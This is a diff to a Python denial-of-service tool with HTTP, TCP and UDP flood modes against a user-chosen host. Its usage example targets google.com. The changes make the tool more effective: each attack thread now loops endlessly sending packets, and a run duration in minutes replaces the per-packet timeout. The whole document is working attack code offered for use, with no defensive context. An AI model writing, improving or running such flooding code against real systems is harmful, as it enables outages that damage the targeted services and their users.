@@ -10,14 +10,14 @@ from threading import Thread
 from termcolor import colored
 
 
-version = 2.0
+version = "2.1"
 
 def showBanner():
 	with open("lib/banner.txt") as f:
-		print(colored( f.read(), "red") + "[" + str(version) + "]\n")
+		print(colored( f.read(), "red") + "[" + version + "]\n")
 
 def usageMsg():
-	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [PACKETS] [TIMEOUT]"
+	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
                 "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10000 0.01\n")
 	exit(0)
 
@@ -52,8 +52,8 @@ if len(sys.argv) == 1:
 
 		try:
 			port     = int(input("[+]PORT (default: 80) > ") or 80 )
-			threads  = int(input("[+]PACKETS (default: 10000)> ") or 10000 ) 
-			timeout  = float(input("[+]TIMEOUT (default: 0.01) > ") or 0.01 ) 
+			threads  = int(input("[+]THREADS (default: 20)> ") or 20 ) 
+			duration  = float(input("[+]DURATION (default: 5 min) > ") or 5 ) 
 			print("")
 			break
 
@@ -70,7 +70,7 @@ else:
 		host_arr = []
 		port     = int(sys.argv[2])
 		threads  = int(sys.argv[3])
-		timeout  = float(sys.argv[4])
+		duration  = float(sys.argv[4])
 	except:
 		usageMsg()
 
@@ -95,6 +95,7 @@ i        = 3
 req      = 0
 err      = 0
 d        = "-------------"
+prog     = (duration * 60.0) / 100.0
 
 while i < len(host_arr):
 	url += host_arr[i] + "/"
@@ -133,19 +134,20 @@ def attackHttp():
 	global req
 	global err
 
-	req += 1
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	while True:
+		req += 1
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	try:
-		sock.connect((host, port))
-		sock.send(request.encode())
-	except:
-		err += 1
-	finally:
-		sock.close()
+		try:
+			sock.connect((host, port))
+			sock.send(request.encode())
+		except:
+			err += 1
+		finally:
+			sock.close()
 
-	if req % 1000 == 0:
-		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 
+		if req % 1000 == 0:
+			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 
 
 def attackTcp():
 	global req
@@ -154,19 +156,20 @@ def attackTcp():
 	data = random._urandom(1024)
 	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)
 
-	req += 1
-	sock = socket.socket()
+	while True:
+		req += 1
+		sock = socket.socket()
 
-	try:
-		sock.connect((ip, port))
-		sock.send(r)
-	except:
-		err += 1
-	finally:
-		sock.close()
+		try:
+			sock.connect((ip, port))
+			sock.send(r)
+		except:
+			err += 1
+		finally:
+			sock.close()
 
-	if req % 1000 == 0:
-		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
+		if req % 1000 == 0:
+			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 def attackUdp():
 	global req
@@ -175,19 +178,20 @@ def attackUdp():
 	data = random._urandom(1024)
 	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)
 
-	req += 1
-	sock = socket.socket()
+	while True:
+		req += 1
+		sock = socket.socket()
 
-	try:
-		sock.connect((ip, port))
-		sock.send(r)
-	except:
-			err += 1
-	finally:
-		sock.close()
+		try:
+			sock.connect((ip, port))
+			sock.send(r)
+		except:
+				err += 1
+		finally:
+			sock.close()
 
-	if req % 1000 == 0:
-		print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
+		if req % 1000 == 0:
+			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 alltypes = ['udp','tcp','http','1','2','3']
 mode     = ""
@@ -213,8 +217,6 @@ while True:
 
 print("[*]STARTING...\n")
 
-all_threads = []
-
 for i in range(threads):
 
 	if mode == 'HTTP':
@@ -227,15 +229,13 @@ for i in range(threads):
 	try:
 		th.daemon = True
 		th.start()
-		all_threads.append(th)
 	except:
 		print(colored("Initialization failed...", "red"))
 
-	time.sleep(timeout)
+try:
+	time.sleep(duration * 60)
+except:
+	print(colored("[-]", "yellow") + " ABORT")
 
-for thr in all_threads:
-	thr.join()
-
-print("\nDone!")
-print("Total: " + str(req) + ", failed: " + str(err) + "\n")
+print("\nTotal: " + str(req) + ", failed: " + str(err) + "\n")
 sys.exit(0)
